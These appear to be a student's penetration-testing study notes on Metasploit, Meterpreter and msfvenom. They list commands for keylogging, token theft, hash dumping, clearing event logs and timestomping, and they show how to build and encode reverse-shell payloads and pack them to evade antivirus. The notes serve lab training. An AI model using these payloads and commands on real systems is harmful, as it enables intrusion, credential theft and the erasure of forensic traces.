
#### MSF - Specific Search

`msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft`

## MSFconsole Commands

| **Command**                                     | **Description**                                                                                                                                   |
| :---------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------------------ |
| `show exploits`                                 | Show all exploits within the Framework.                                                                                                           |
| `show payloads`                                 | Show all payloads within the Framework.                                                                                                           |
| `show auxiliary`                                | Show all auxiliary modules within the Framework.                                                                                                  |
| `search <name>`                                 | Search for exploits or modules within the Framework.                                                                                              |
| `info`                                          | Load information about a specific exploit or module.                                                                                              |
| `use <name>`                                    | Load an exploit or module (example: use windows/smb/psexec).                                                                                      |
| `use <number>`                                  | Load an exploit by using the index number displayed after the search command.                                                                     |
| `LHOST`                                         | Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells. |
| `RHOST`                                         | The remote host or the target. set function Set a specific value (for example, LHOST or RHOST).                                                   |
| `setg <function>`                               | Set a specific value globally (for example, LHOST or RHOST).                                                                                      |
| `show options`                                  | Show the options available for a module or exploit.                                                                                               |
| `show targets`                                  | Show the platforms supported by the exploit.                                                                                                      |
| `set target <number>`                           | Specify a specific target index if you know the OS and service pack.                                                                              |
| `set payload <payload>`                         | Specify the payload to use.                                                                                                                       |
| `set payload <number>`                          | Specify the payload index number to use after the show payloads command.                                                                          |
| `show advanced`                                 | Show advanced options.                                                                                                                            |
| `set autorunscript migrate -f`                  | Automatically migrate to a separate process upon exploit completion.                                                                              |
| `check`                                         | Determine whether a target is vulnerable to an attack.                                                                                            |
| `exploit`                                       | Execute the module or exploit and attack the target.                                                                                              |
| `exploit -j`                                    | Run the exploit under the context of the job. (This will run the exploit in the background.)                                                      |
| `exploit -z`                                    | Do not interact with the session after successful exploitation.                                                                                   |
| `exploit -e <encoder>`                          | Specify the payload encoder to use (example: exploit –e shikata_ga_nai).                                                                          |
| `exploit -h`                                    | Display help for the exploit command.                                                                                                             |
| `sessions -l`                                   | List available sessions (used when handling multiple shells).                                                                                     |
| `sessions -l -v`                                | List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system.                             |
| `set session <>`                                |                                                                                                                                                   |
| `sessions -s <script>`                          | Run a specific Meterpreter script on all Meterpreter live sessions.                                                                               |
| `sessions -K`                                   | Kill all live sessions.                                                                                                                           |
| `sessions -c <cmd>`                             | Execute a command on all live Meterpreter sessions.                                                                                               |
| `sessions -u <sessionID>`                       | Upgrade a normal Win32 shell to a Meterpreter console.                                                                                            |
| `db_create <name>`                              | Create a database to use with database-driven attacks (example: db_create autopwn).                                                               |
| `db_connect <name>`                             | Create and connect to a database for driven attacks (example: db_connect autopwn).                                                                |
| `db_nmap`                                       | Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as –sT –v –P0.)                                                  |
| `db_destroy`                                    | Delete the current database.                                                                                                                      |
| `db_destroy <user:password@host:port/database>` | Delete database using advanced options.                                                                                                           |


---

## Meterpreter Commands

Meterpreter resides entirely in the memory of the remote host and leaves no traces on the hard drive, making it difficult to detect with conventional forensic techniques.

| **Command**                                           | **Description**                                                                               |
| :---------------------------------------------------- | :-------------------------------------------------------------------------------------------- |
| `help`                                                | Open Meterpreter usage help.                                                                  |
| `run <scriptname>`                                    | Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory.       |
| `sysinfo`                                             | Show the system information on the compromised target.                                        |
| `ls`                                                  | List the files and folders on the target.                                                     |
| `use priv`                                            | Load the privilege extension for extended Meterpreter libraries.                              |
| `ps`                                                  | Show all running processes and which accounts are associated with each process.               |
| `migrate <proc. id>`                                  | Migrate to the specific process ID (PID is the target process ID gained from the ps command). |
| `use incognito`                                       | Load incognito functions. (Used for token stealing and impersonation on a target machine.)    |
| `list_tokens -u`                                      | List available tokens on the target by user.                                                  |
| `list_tokens -g`                                      | List available tokens on the target by group.                                                 |
| `impersonate_token <DOMAIN_NAMEUSERNAME>`             | Impersonate a token available on the target.                                                  |
| `steal_token <proc. id>`                              | Steal the tokens available for a given process and impersonate that token.                    |
| `drop_token`                                          | Stop impersonating the current token.                                                         |
| `getsystem`                                           | Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.        |
| `shell`                                               | Drop into an interactive shell with all available tokens.                                     |
| `execute -f <cmd.exe> -i`                             | Execute cmd.exe and interact with it.                                                         |
| `execute -f <cmd.exe> -i -t`                          | Execute cmd.exe with all available tokens.                                                    |
| `execute -f <cmd.exe> -i -H -t`                       | Execute cmd.exe with all available tokens and make it a hidden process.                       |
| `rev2self`                                            | Revert back to the original user you used to compromise the target.                           |
| `reg <command>`                                       | Interact, create, delete, query, set, and much more in the target’s registry.                 |
| `setdesktop <number>`                                 | Switch to a different screen based on who is logged in.                                       |
| `screenshot`                                          | Take a screenshot of the target’s screen.                                                     |
| `upload <filename>`                                   | Upload a file to the target.                                                                  |
| `download <filename>`                                 | Download a file from the target.                                                              |
| `keyscan_start`                                       | Start sniffing keystrokes on the remote target.                                               |
| `keyscan_dump`                                        | Dump the remote keys captured on the target.                                                  |
| `keyscan_stop`                                        | Stop sniffing keystrokes on the remote target.                                                |
| `getprivs`                                            | Get as many privileges as possible on the target.                                             |
| `uictl enable <keyboard/mouse>`                       | Take control of the keyboard and/or mouse.                                                    |
| `background`                                          | Run your current Meterpreter shell in the background.                                         |
| `hashdump`                                            | Dump all hashes on the target. use sniffer Load the sniffer module.                           |
| `sniffer_interfaces`                                  | List the available interfaces on the target.                                                  |
| `sniffer_dump <interfaceID> pcapname`                 | Start sniffing on the remote target.                                                          |
| `sniffer_start <interfaceID> packet-buffer`           | Start sniffing with a specific range for a packet buffer.                                     |
| `sniffer_stats <interfaceID>`                         | Grab statistical information from the interface you are sniffing.                             |
| `sniffer_stop <interfaceID>`                          | Stop the sniffer.                                                                             |
| `add_user <username> <password> -h <ip>`              | Add a user on the remote target.                                                              |
| `add_group_user <"Domain Admins"> <username> -h <ip>` | Add a username to the Domain Administrators group on the remote target.                       |
| `clearev`                                             | Clear the event log on the target machine.                                                    |
| `timestomp`                                           | Change file attributes, such as creation date (antiforensics measure).                        |
| `reboot`                                              | Reboot the target machine.                                                                    |

#### Metasploit Payload 

**`_` = Staged** = Small payload → Downloads **Stage 2** → Gets full shell. The scope of this payload is to be as compact and inconspicuous as possible to aid with the Antivirus (`AV`) / Intrusion Prevention System (`IPS`) evasion as much as possible.

Example:
```text
windows/shell_bind_tcp
windows/meterpreter_reverse_tcp
```

**`/` = Stageless (single)**  = Complete payload → No Stage 2 → Shell runs directly

Example:
```text
windows/shell/bind_tcp
windows/meterpreter/reverse_tcp
```

- **Stager = Starter, Its only job is to download the Stage** 
- **Stage = Real Payload**

## MSF Database 

| Task | Command |
|------|---------|
| Start DB | `sudo msfdb start` |
| Open Metasploit | `msfconsole` |
| Check DB | `db_status` |
| Create Workspace | `workspace -a HTB` |
| Switch Workspace | `workspace HTB` |
| Import Scan | `db_import scan.xml` |
| Run Nmap (save to DB) | `db_nmap -sV -A <IP>` |
| Show Hosts | `hosts` |
| Show Services | `services` |
| Show Vulnerabilities | `vulns` |
| Show Credentials | `creds` |
| Export Results | `db_export -f xml report.xml` |
## Common Metasploit Plugins

| Plugin                | Purpose                           |
| --------------------- | --------------------------------- |
| `load nessus`         | Import Nessus scan results        |
| `load nmap`           | Run Nmap from Metasploit          |
| `load scanner`        | Extra scanning modules            |
| `load auto_add_route` | Auto-add pivot routes             |
| `load wmap`           | Basic web app testing             |
| `load ips_filter`     | Filter targets by IP              |
| `load db_credcollect` | Collect credentials from sessions |
| `load`                | List loaded plugins               |
| `load <plugin>`       | Load a plugin                     |
| `unload <plugin>`     | Unload a plugin                   |

**You use `local_exploit_suggester` after you already have a session on the target and want to find privilege escalation opportunities**.


## Windows Credential Looting

After gaining privilege as system in windows, you can look for:

| Command | Gets You | Save |
|---------|----------|------|
| `hashdump` | Local user password hashes | ✅ Usernames + **NTLM hashes** |
| `lsa_dump_sam` | SAM database (local users & hashes) | ✅ Usernames + **NTLM hashes** |
| `lsa_dump_secrets` | Windows stored secrets | ✅ Plaintext passwords, service creds, auto-logon creds, domain creds |

#### What to Ignore (Usually)

❌ SysKey

❌ LSA Key

❌ SAMKey

❌ Local SID

❌ DPAPI_SYSTEM

❌ NL$KM

❌ Long HEX blobs

❌ Service names without passwords

### What Can I Do Next?

| Loot | Next Step |
|------|-----------|
| Plaintext Password | Login to SSH/RDP/SMB/WinRM/etc. |
| NTLM Hash | Crack with Hashcat/John or Pass-the-Hash |
| Service Account | Try lateral movement or privilege escalation |
| Domain Credential | Try authentication on other hosts |

# Section 11 - Metepreter Question:

- Nmap showing IIS 10.0 didn't mean it was exploitable; the working path was through FortiLogger.
- Also found `ms-wbt-server` , googled it and found the version was vulnerable, tried searching more though `nmap -p3389 --script rdp-enum-encryption <IP>` , but found nothing.
- Learned to migrate Meterpreter into a stable **SYSTEM** process (e.g., `services.exe`, `winlogon.exe`, `lsass.exe`) to make the session more stable and enable post-exploitation commands.

# Section 13 - MSFVenom Workflow

- **MSFVenom** = Generates custom payloads (successor to `msfpayload` + `msfencode`).
- Supports multiple **payloads**, **formats** (`.exe`, `.aspx`, `.php`, `.war`, etc.), and target architectures.
- Modern AVs can still detect many payloads—encoding is **not** a guaranteed bypass.

### Typical Workflow

1. Enumerate the target (Nmap, FTP, HTTP, etc.).
2. Choose a payload based on the target (e.g., `.aspx` for IIS, `.php` for PHP, `.war` for Tomcat).
3. Generate payload:
   ```bash
   msfvenom -p <payload> LHOST=<IP> LPORT=<PORT> -f <format> -o shell.<ext>
   ```
4. Upload the payload (FTP, upload form, SMB, etc.).
5. Start a listener:
   ```text
   use multi/handler
   set PAYLOAD <same_payload>
   set LHOST <IP>
   set LPORT <PORT>
   run
   ```
6. Trigger the payload (visit/open the uploaded file).
7. If Meterpreter lands as a low-privileged user, run:
   ```text
   use post/multi/recon/local_exploit_suggester
   ```
8. Try the suggested local privilege escalation exploit to become **SYSTEM**.




# Section 14 - Firewall & IDS/IPS Evasion 

## 1. Quick Concepts

|Term|Meaning|When to Use|
|---|---|---|
|**Firewall**|Allows or blocks traffic|Control network access|
|**IDS**|Detects and alerts|Monitor suspicious activity|
|**IPS**|Detects and blocks|Stop malicious traffic automatically|
|**Endpoint Protection**|Protects one device|Secure computers and servers|
|**Perimeter Protection**|Protects the network edge|Secure the whole network|
|**DMZ**|Separate zone for public servers|Host web, mail, or DNS servers|
|**Encoding**|Changes data format|Test pattern changes in a lab|
|**Encryption**|Protects data with a key|Secure traffic or files|
|**Packing**|Changes or compresses an executable|Study executable structure|


## 2. Generate a Lab Payload

```bash
msfvenom windows/x86/meterpreter_reverse_tcp \
LHOST=<YOUR_IP> LPORT=<PORT> \
-a x86 --platform windows \
-o payload.exe
```

|Part|Meaning|
|---|---|
|`LHOST`|Your listener IP|
|`LPORT`|Your listener port|
|`-a x86`|32-bit architecture|
|`--platform windows`|Windows target|
|`-o payload.exe`|Output file|

So the payload is created, but if you want to  changes how the file is packaged, follow below: 

```
msfvenom
→ create payload
→ optionally encode it
→ optionally use a template
→ save as .exe
```

These steps may reduce detection by some basic static scanners, but they do not make the payload truly stealthy or safe. Modern security tools can still detect it through its behaviour, memory activity, network connection, or suspicious file structure.

## 3. Encode the Payload

```bash
msfvenom windows/x86/meterpreter_reverse_tcp \
LHOST=<YOUR_IP> LPORT=<PORT> \
-e x86/shikata_ga_nai -i 5 \
-a x86 --platform windows \
-o payload.exe
```

|Option|Meaning|
|---|---|
|`-e`|Select encoder|
|`-i 5`|Encode five times|

## 4. Use an EXE Template

```bash
msfvenom windows/x86/meterpreter_reverse_tcp \
LHOST=<YOUR_IP> LPORT=<PORT> \
-x template.exe -k \
-a x86 --platform windows \
-o output.exe
```

|Option|Meaning|
|---|---|
|`-x template.exe`|Use an executable as a template|
|`-k`|Try to keep the original program running|

## 5. Scan a Lab File

```bash
msf-virustotal -k <API_KEY> -f payload.exe
```

|Option|Meaning|
|---|---|
|`-k`|VirusTotal API key|
|`-f`|File to scan|

**Use when:** Checking how public antivirus engines classify a non-confidential lab sample.

```text
11 / 59
```


## Archives

Archiving a piece of information such as a file, folder, script, executable, picture, or document and placing a password on the archive bypasses a lot of common anti-virus signatures today. But archive uploaded ≠ archive executed. The archive step is about **packaging and testing detection**, not execution. You need to unzip it in the target to work if uploaded as archived.

| Task                     | Command                              |
| ------------------------ | ------------------------------------ |
| Create archive           | `rar a archive.rar file.txt`         |
| Password-protect archive | `rar a archive.rar -p file.txt`      |
| Extract `.tar.gz`        | `tar -xzvf file.tar.gz`              |
| Extract and enter folder | `tar -xzvf file.tar.gz && cd folder` |

| Option | Meaning                   |
| ------ | ------------------------- |
| `a`    | Add a file to the archive |
| `-p`   | Ask for a password        |
| `x`    | Extract                   |
| `z`    | Gzip archive              |
| `v`    | Show extracted files      |
| `f`    | Use the specified file    |
